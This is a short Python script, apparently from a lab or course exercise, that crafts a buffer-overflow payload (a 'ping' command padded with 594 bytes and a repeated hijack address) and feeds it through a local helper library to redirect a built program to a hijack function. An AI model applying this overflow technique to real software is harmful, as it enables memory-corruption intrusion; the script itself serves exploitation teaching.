#!/usr/bin/env python3

"""Script to run exploit 1.

Instructions: `make` the project, then run this script.

This script requires Python 3.6 or higher."""


import pathlib
import sys


# `HERE` is the directory this script is located in.
HERE = pathlib.Path(__file__).resolve().parent


def main():
    """Run the exploit."""

    print("Exploit 1 should run the hijack function...")

    sys.path.append(str(HERE.parent))
    import exploitlib

    exploit = b'ping ' + b'A' * 594 + exploitlib.HIJACK_ADDRESS * 62 + b'\n'
    exploitlib.run(exploit_bytes=exploit)


if __name__ == '__main__':
    main()
